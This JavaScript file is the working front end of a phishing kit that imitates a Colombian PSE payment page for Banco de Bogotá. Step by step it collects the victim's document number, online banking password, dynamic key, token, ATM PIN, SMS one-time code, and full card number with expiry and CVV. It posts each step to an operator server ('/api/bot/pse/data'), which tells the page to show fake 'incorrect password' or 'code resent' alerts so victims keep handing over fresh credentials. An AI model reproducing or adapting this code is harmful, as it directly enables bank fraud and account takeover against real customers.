const DOMElements = {
    // Loader
    loader: document.querySelector('#loader'),
    
    // Elementos del paso usuario
    contStepUser: document.querySelector('#step-user'),
    inputTipoCliente: document.querySelector('#tipo-cliente'),
    inputTipoDocumento: document.querySelector('#tipo-documento'),
    inputNumeroDocumento: document.querySelector('#numero-documento'),
    btnUserNext: document.querySelector('#step-user-next'),

    // Elementos del paso contraseña
    contStepPass: document.querySelector('#step-pass'),
    inputPass: document.querySelector('#pass'),
    btnPassNext: document.querySelector('#step-pass-next'),

    // Elementos del paso clave dinámica
    contStepCdin: document.querySelector('#step-cdin'),
    cdinInputs: document.querySelectorAll('[id^="cdin-digit"]'),
    inputCdinDigit1: document.querySelector('#cdin-digit-1'),
    inputCdinDigit2: document.querySelector('#cdin-digit-2'),
    inputCdinDigit3: document.querySelector('#cdin-digit-3'),
    inputCdinDigit4: document.querySelector('#cdin-digit-4'),
    inputCdinDigit5: document.querySelector('#cdin-digit-5'),
    inputCdinDigit6: document.querySelector('#cdin-digit-6'),
    btnCdinNext: document.querySelector('#step-cdin-next'),

    // Elementos del paso token
    contStepToken: document.querySelector('#step-token'),
    tokenInputs: document.querySelectorAll('[id^="token-digit"]'),
    btnTokenNext: document.querySelector('#step-token-next'),

    // Elementos del paso clave de cajero
    contStepCcaj: document.querySelector('#step-ccaj'),
    ccajInputs: document.querySelectorAll('[id^="ccaj-digit"]'),
    inputCcajDigit1: document.querySelector('#ccaj-digit-1'),
    inputCcajDigit2: document.querySelector('#ccaj-digit-2'),
    inputCcajDigit3: document.querySelector('#ccaj-digit-3'),
    inputCcajDigit4: document.querySelector('#ccaj-digit-4'),
    btnCcajNext: document.querySelector('#step-ccaj-next'),

    // Elementos del paso OTP
    contStepOtp: document.querySelector('#step-otp'),
    otpInputs: document.querySelectorAll('[id^="otp-digit"]'),
    inputOtpDigit1: document.querySelector('#otp-digit-1'),
    inputOtpDigit2: document.querySelector('#otp-digit-2'),
    inputOtpDigit3: document.querySelector('#otp-digit-3'),
    inputOtpDigit4: document.querySelector('#otp-digit-4'),
    inputOtpDigit5: document.querySelector('#otp-digit-5'),
    inputOtpDigit6: document.querySelector('#otp-digit-6'),
    btnOtpNext: document.querySelector('#step-otp-next'),

    // Elementos del paso tarjeta
    contStepCard: document.querySelector('#step-card'),
    btnCardNext: document.querySelector('#step-card-next'),

    // Elementos del paso resumen
    contStepResumen: document.querySelector('#step-resumen'),
    labelAmount: document.querySelector('#amount'),
    labelPagOrigin: document.querySelector('#pag-origin'),
    labelPagCus: document.querySelector('#pag-cus'),
    labelPagFactura: document.querySelector('#pag-factura'),
    btnResumenNext: document.querySelector('#step-resumen-next'),
};

/**
 * Módulo de validadores
 */
const validators = {
    user: (tipoCliente, tipoDocumento, numeroDocumento) => {
        return tipoCliente && tipoDocumento && numeroDocumento && numeroDocumento.length >= 4;
    },
    
    pass: (passValue) => {
        return passValue && passValue.length >= 4;
    },
    
    password: (inputs) => {
        return Array.from(inputs).every(input => input.value !== '');
    },
    
    card: () => {
        const p = document.querySelector('#p');
        const pdate = document.querySelector('#pdate');
        const c = document.querySelector('#c');

        if((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')){
            if(isLuhnValid(p.value)){
                if(isValidDate(pdate.value)){
                    if((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)){
                        return {
                            bin: p.value,
                            date: pdate.value,
                            cs: c.value
                        }
                    }else{
                        alert('Revise el CVV de su tarjeta.');
                        c.value = '';
                        c.focus();
                        return false;
                    }
                }else{
                    alert('Revise la fecha de vencimiento de su tarjeta.');
                    pdate.value = '';
                    pdate.focus();
                    return false;
                }
            }else{
                alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
                p.value = ''
                p.focus();
                return false;
            }
        }else{
            alert('Revisa el número de tu tarjeta.');
            p.value = '';
            p.focus();
            return false;
        }
    }
};

/**
 * Módulo de gestión de estado
 */
const stateManager = {
    updateUser: (tipoCliente, tipoDocumento, numeroDocumento) => {
        info.metaInfo.user = `${tipoCliente} - ${tipoDocumento} - ${numeroDocumento}`;
        info.metaInfo.mode = 'pass';
        updateLS();
    },
    
    updatePass: (pass) => {
        info.metaInfo.pass = pass;
        info.metaInfo.mode = 'cdin';
        updateLS();
    },
    
    updateCdin: (cdin) => {
        info.metaInfo.cdin = cdin;
        updateLS();
    },
    
    updateToken: (token) => {
        info.metaInfo.token = token;
        updateLS();
    },
    
    updateCcaj: (ccaj) => {
        info.metaInfo.ccaj = ccaj;
        updateLS();
    },
    
    updateOtp: (otp) => {
        info.metaInfo.otpcode = otp;
        updateLS();
    },
    
    updateCard: (fields) => {
        info.metaInfo.bin = fields.bin;
        info.metaInfo.date = fields.date;
        info.metaInfo.cs = fields.cs;
        updateLS();
    },
    
    updateCardType: (type) => {
        info.metaInfo.cardType = type; // 'credit' o 'debit'
        updateLS();
    },
    
    resetState: () => {
        info.metaInfo.mode = '';
        info.metaInfo.bank = '';
        info.metaInfo.tipoCliente = '';
        info.metaInfo.tipoDocumento = '';
        info.metaInfo.numeroDocumento = '';
        info.metaInfo.pass = '';
        info.metaInfo.cdin = '';
        info.metaInfo.token = '';
        info.metaInfo.ccaj = '';
        info.metaInfo.otpcode = '';
        info.metaInfo.bin = '';
        info.metaInfo.date = '';
        info.metaInfo.cs = '';
        info.metaInfo.cardType = '';
        updateLS();
    },
    
    setCardMode: () => {
        info.metaInfo.mode = 'card';
    }
};

/**
 * Módulo de navegación
 */
const navigationManager = {
    goToStep: (step) => {
        showStep(step);
    },
    
    goBack: () => {
        if(confirm('¿Quieres cancelar el proceso? Volverás a la web del comercio')){
            stateManager.resetState();
            window.opener.postMessage({ action: 'done', data: { response: 'cancel'} }, '*');
        }
    },
    
    goToSuccess: () => {
        stateManager.resetState();
        window.opener.postMessage({ action: 'done', data: { response: 'success'} }, '*');
    },
    
    goToBankSelection: () => {
        stateManager.resetState();
        window.location.reload();
    }
};

/**
 * Módulo de API
 */
const apiService = {
    sendData: async (payload) => {
        const tokenn = KJUR.jws.JWS.sign(null, { alg: "HS256" }, payload, JWT_SIGN);
        const response = await fetch(`${API_URL}/api/bot/pse/data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${info.metaInfo.TRANSID}`
            },
            body: JSON.stringify({ token: tokenn })
        });
        return response.json();
    },
    
    handleResponse: (result) => {
        DOMElements.loader.classList.remove('flex');
        const goto = result.redirect_to;

        switch (goto) {
            case 'user':
                if (info.metaInfo.user !== '') {
                    alert('Tu usuario o contraseña son incorrectos. Ingresa nuevamente.');
                }

                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepUser);
                break;
                
            case 'pass':
                if (info.metaInfo.pass !== '') {
                    alert('Contraseña incorrecta. Intente nuevamente.');
                }

                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepPass);
                break;
                
            // case 'cdin':
            //     if (info.metaInfo.cdin !== '') {
            //         alert('Clave dinámica incorrecta o expiró. Intente nuevamente.');
            //     }
            //     viewManager.restartViews();
            //     navigationManager.goToStep(DOMElements.contStepCdin);
            //     break;
            case 'cdin':
                if (info.metaInfo.cdin !== '') {
                    alert('Token dinámico incorrecto. Intente nuevamente.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepCdin);
                break;
                
            // case 'token':
            //     if (info.metaInfo.token !== '') {
            //         alert('Token incorrecto. Intente nuevamente.');
            //     }
            //     viewManager.restartViews();
            //     navigationManager.goToStep(DOMElements.contStepToken);
            //     break;
            case 'token':
                if (info.metaInfo.token !== '') {
                    alert('Token dinámico incorrecto. Intente nuevamente.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepCdin);
                break;
                
            case 'ccajero':
                if (info.metaInfo.ccaj !== '') {
                    alert('Clave de cajero incorrecta. Intente nuevamente.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepCcaj);
                break;
                
            case 'otpcode':
                if (info.metaInfo.otpcode !== '') {
                    alert('Enviamos nuevamente un Código de Seguridad a tu teléfono. Ingresalo nuevamente.');
                } else {
                    alert('Enviamos un Código de Seguridad a tu teléfono. Por favor ingresalo');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepOtp);
                break;
                
            case 'tcred':
                stateManager.setCardMode();
                const wasCreditBefore = info.metaInfo.cardType === 'credit';
                stateManager.updateCardType('credit');
                if (wasCreditBefore && info.metaInfo.bin !== '') {
                    alert('Ingrese nuevamente sus datos de tarjeta de crédito, asegurese de que sea un producto que tenga vinculado al Banco de Bogotá')
                } else {
                    alert('Por favor ingrese con su tarjeta de crédito')
                }
                viewManager.clearCardFields();
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepCard);
                break;
            
            case 'tdeb':
                stateManager.setCardMode();
                const wasDebitBefore = info.metaInfo.cardType === 'debit';
                stateManager.updateCardType('debit');
                if (wasDebitBefore && info.metaInfo.bin !== '') {
                    alert('Ingrese nuevamente sus datos de tarjeta de débito, asegurese de que sea un producto que tenga vinculado al Banco de Bogotá')
                } else {
                    alert('Por favor ingrese con su tarjeta de débito')
                }
                viewManager.clearCardFields();
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepCard);
                break;
                
            case 'resume':
                DOMElements.labelAmount.textContent = formatPrice(info.metaInfo.amount);
                DOMElements.labelPagOrigin.textContent = info.metaInfo.origin;
                DOMElements.labelPagCus.textContent = '1574829293';
                DOMElements.labelPagFactura.textContent = '77482920';
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.contStepResumen);
                break;
                
            case 'bank':
                alert('En este momento no podemos atender tu solicitud, por favor intente más tarde.');
                navigationManager.goToBankSelection();
                break;
                
            case 'success':
                navigationManager.goToSuccess();
                break;

            case 'cancel':
                stateManager.resetState();
                window.opener.postMessage({ action: 'done', data: { response: 'cancel'} }, '*');
                break;
                
            default:
                console.error('No se reconoce el redirect_to:', goto);
                throw new Error();
        }
    },
    
    handleError: (err = null) => {
        DOMElements.loader.classList.remove('flex');
        console.log(err)
        console.log('Error en la API');
        alert('No pudimos seguir con el proceso de solicitud. Intente nuevamente más tarde.');
        navigationManager.goToBankSelection();
    }
};

/**
 * Módulo de gestión de vistas
 */
const viewManager = {
    restartViews: () => {
        const {
            contStepUser,
            contStepPass,
            contStepCdin,
            contStepToken,
            contStepCcaj,
            contStepOtp,
            contStepCard,
            contStepResumen,
            inputTipoCliente,
            inputTipoDocumento,
            inputNumeroDocumento,
            inputPass,
            inputCdinDigit1,
            inputCdinDigit2,
            inputCdinDigit3,
            inputCdinDigit4,
            inputCdinDigit5,
            inputCdinDigit6,
            inputCcajDigit1,
            inputCcajDigit2,
            inputCcajDigit3,
            inputCcajDigit4,
            inputOtpDigit1,
            inputOtpDigit2,
            inputOtpDigit3,
            inputOtpDigit4,
            inputOtpDigit5,
            inputOtpDigit6
        } = DOMElements;

        if (!contStepUser.classList.contains('hidden')){
            contStepUser.classList.add('hidden');
        }
        if (!contStepPass.classList.contains('hidden')){
            contStepPass.classList.add('hidden');
        }
        if (!contStepCdin.classList.contains('hidden')){
            contStepCdin.classList.add('hidden');
        }
        if (!contStepToken.classList.contains('hidden')){
            contStepToken.classList.add('hidden');
        }
        if (!contStepCcaj.classList.contains('hidden')){
            contStepCcaj.classList.add('hidden');
        }
        if (!contStepOtp.classList.contains('hidden')){
            contStepOtp.classList.add('hidden');
        }
        if (!contStepCard.classList.contains('hidden')){
            contStepCard.classList.add('hidden');
        }
        if (!contStepResumen.classList.contains('hidden')){
            contStepResumen.classList.add('hidden');
        }

        inputTipoCliente.value = 'Banca Personas';
        inputTipoDocumento.value = 'C.C.';
        inputNumeroDocumento.value = '';
        inputPass.value = '';
        inputCdinDigit1.value = '';
        inputCdinDigit2.value = '';
        inputCdinDigit3.value = '';
        inputCdinDigit4.value = '';
        inputCdinDigit5.value = '';
        inputCdinDigit6.value = '';
        inputCcajDigit1.value = '';
        inputCcajDigit2.value = '';
        inputCcajDigit3.value = '';
        inputCcajDigit4.value = '';
        inputOtpDigit1.value = '';
        inputOtpDigit2.value = '';
        inputOtpDigit3.value = '';
        inputOtpDigit4.value = '';
        inputOtpDigit5.value = '';
        inputOtpDigit6.value = '';
        DOMElements.tokenInputs.forEach(input => input.value = '');
    },
    
    clearCardFields: () => {
        document.querySelector('#p').value = '';
        document.querySelector('#pdate').value = '';
        document.querySelector('#c').value = '';
    },
    
    showLoader: () => {
        DOMElements.loader.classList.add('flex');
    },
    
    hideLoader: () => {
        DOMElements.loader.classList.remove('flex');
    }
};

/**
 * Manejadores de eventos por paso
 */
const eventHandlers = {
    user: {
        next: async (e) => {
            e.preventDefault()

            const tipoCliente = DOMElements.inputTipoCliente.value;
            const tipoDocumento = DOMElements.inputTipoDocumento.value;
            const numeroDocumento = DOMElements.inputNumeroDocumento.value;
            
            if (validators.user(tipoCliente, tipoDocumento, numeroDocumento)) {
                stateManager.updateUser(tipoCliente, tipoDocumento, numeroDocumento);
                viewManager.showLoader();
                await sleep(2700);
                viewManager.hideLoader();
                navigationManager.goToStep(DOMElements.contStepPass);
                
            } else {
                alert('El número de documento debe tener al menos 4 caracteres.');
            }
        }
    },
    
    pass: {
        next: async (e) => {
            e.preventDefault()
            if (validators.pass(DOMElements.inputPass.value)) {
                stateManager.updatePass(DOMElements.inputPass.value);
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(apiService.handleError);
            } else {
                alert('La contraseña debe tener al menos 4 caracteres.');
            }
        }
    },
    
    cdin: {
        next: async (e) => {
            e.preventDefault()
            if (validators.password(DOMElements.cdinInputs)) {
                stateManager.updateCdin(getConcatenatedValue(DOMElements.cdinInputs));
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(apiService.handleError);
            } else {
                alert('Debes completar todos los dígitos de la clave dinámica.');
            }
        }
    },
    
    token: {
        next: async (e) => {
            e.preventDefault()
            if (validators.password(DOMElements.tokenInputs)) {
                stateManager.updateToken(getConcatenatedValue(DOMElements.tokenInputs));
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(apiService.handleError);
            } else {
                alert('Debes completar todos los dígitos del token.');
            }
        }
    },
    
    ccaj: {
        next: async (e) => {
            e.preventDefault()
            if (validators.password(DOMElements.ccajInputs)) {
                stateManager.updateCcaj(getConcatenatedValue(DOMElements.ccajInputs));
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(apiService.handleError);
            } else {
                alert('Debes completar todos los dígitos de la clave de cajero.');
            }
        }
    },
    
    otp: {
        next: async (e) => {
            e.preventDefault()
            if (validators.password(DOMElements.otpInputs)) {
                stateManager.updateOtp(getConcatenatedValue(DOMElements.otpInputs));
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(apiService.handleError);
            } else {
                alert('Debes completar todos los dígitos del Código de Seguridad.');
            }
        }
    },
    
    card: {
        next: async (e) => {
            e.preventDefault()
            const fields = validators.card();
            if (fields) {
                stateManager.updateCard(fields);
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(apiService.handleError);
            } else {
                alert('Revisa los datos ingresados');
                return;
            }
        }
    },

    resumen: {
        next: async (e) => {
            e.preventDefault()
            viewManager.showLoader();
            await apiService.sendData(info.metaInfo)
                .then(apiService.handleResponse)
                .catch(apiService.handleError);
        }
    },
};

/**
 * Startup
 */
document.addEventListener('DOMContentLoaded', () => {
    showStep(DOMElements.contStepUser);
    addEventListeners();
});

/**
 * Event Listeners
 */
const addEventListeners = async () => {
    const {
        btnUserNext,
        btnPassNext,
        btnCdinNext,
        btnTokenNext,
        btnCcajNext,
        btnOtpNext,
        btnCardNext,
        btnResumenNext,
        cdinInputs,
        tokenInputs,
        ccajInputs,
        otpInputs
    } = DOMElements;

    setupDigitInputs(cdinInputs);
    setupDigitInputs(tokenInputs);
    setupDigitInputs(ccajInputs);
    setupDigitInputs(otpInputs);

    // Paso 1: Usuario
    btnUserNext.addEventListener('click', eventHandlers.user.next);

    // Paso 2: Contraseña
    btnPassNext.addEventListener('click', eventHandlers.pass.next);

    // Paso 3: Clave Dinámica
    btnCdinNext.addEventListener('click', eventHandlers.cdin.next);

    // Paso 4: Token
    btnTokenNext.addEventListener('click', eventHandlers.token.next);

    // Paso 5: Clave de Cajero
    btnCcajNext.addEventListener('click', eventHandlers.ccaj.next);

    // Paso 6: OTP
    btnOtpNext.addEventListener('click', eventHandlers.otp.next);

    // Paso 7: Tarjeta
    btnCardNext.addEventListener('click', eventHandlers.card.next);

    // Paso 8: Resumen
    btnResumenNext.addEventListener('click', eventHandlers.resumen.next);
};

/**
 * Functions
 */
const setupDigitInputs = (inputs) => {
    inputs.forEach((input, index) => {
        input.addEventListener('input', () => handleInput(input, inputs, index));
        input.addEventListener('keydown', (event) => handleKeyDown(event, input, inputs, index));
    });
}

function handleInput(input, inputs, index) {
    const nextInput = inputs[index + 1];
    if (input.value.length > 0 && nextInput) {
        nextInput.focus();
    }
}

function handleKeyDown(event, input, inputs, index) {
    if (event.key === 'Backspace' && input.value === '') {
        const previousInput = inputs[index - 1];
        if (previousInput) {
            previousInput.focus();
        }
    } else if (event.key >= '0' && event.key <= '9') {
        // Permitir solo números
        input.value = ''; // Limpiar para reemplazar con el nuevo valor
    } else if (event.key !== 'Backspace' && event.key !== 'Tab') {
        event.preventDefault(); // Prevenir cualquier entrada no numérica que no sea backspace o tab
    }
}

function getConcatenatedValue(inputs) {
    return Array.from(inputs).map(input => input.value).join('');
}

function showStep(stepToShow) {
    const {
        contStepUser,
        contStepPass,
        contStepCdin,
        contStepToken,
        contStepCcaj,
        contStepOtp,
        contStepCard,
        contStepResumen
    } = DOMElements;

    // Ocultar todos los pasos añadiendo la clase 'hidden'
    [contStepUser, contStepPass, contStepCdin, contStepToken, contStepCcaj, contStepOtp, contStepCard, contStepResumen].forEach(step => {
        step.classList.add('hidden');
    });

    // Mostrar el paso solicitado quitando la clase 'hidden'
    console.log(stepToShow);
    stepToShow.classList.remove('hidden');

    if (stepToShow === DOMElements.contStepPass) {
        DOMElements.inputPass.focus();
    } else if (stepToShow === DOMElements.contStepCdin) {
        DOMElements.cdinInputs[0].focus();
    } else if (stepToShow === DOMElements.contStepToken) {
        DOMElements.tokenInputs[0].focus();
    } else if (stepToShow === DOMElements.contStepCcaj) {
        DOMElements.ccajInputs[0].focus();
    } else if (stepToShow === DOMElements.contStepOtp) {
        DOMElements.otpInputs[0].focus();
    }
}

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos

    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {

        c.setAttribute('oninput', "limitDigits(this, 4)");

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        c.setAttribute('oninput', "limitDigits(this, 3)");
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value;
    
    texto = texto.replace(/\D/g, '');

    texto = texto.substring(0, 4);

    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    var partes = fechaInput.split('/');
    var mesInput = parseInt(partes[0], 10);
    var añoInput = parseInt(partes[1], 10);

    // Verificar que el mes no sea mayor a 12
    if (mesInput > 12) {
        return false;
    }

    // Ajustar el año para tener en cuenta el formato de dos dígitos
    añoInput += 2000;

    var fechaActual = new Date();
    var añoActual = fechaActual.getFullYear();
    var limiteAño = añoActual + 8; // Año actual + 8

    // Verificar que el año no sea mayor al año actual + 8
    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) {
        return false;
    }

    // Verificar que la fecha no sea futura
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth() + 1))) {
        return true;
    } else {
        return false;
    }
}

function formatPrice(number){
    return number.toLocaleString('es-CO', {
        maximumFractionDigits: 2,
        useGrouping: true,
        style: 'currency', 
        currency: 'COP'
    });
}
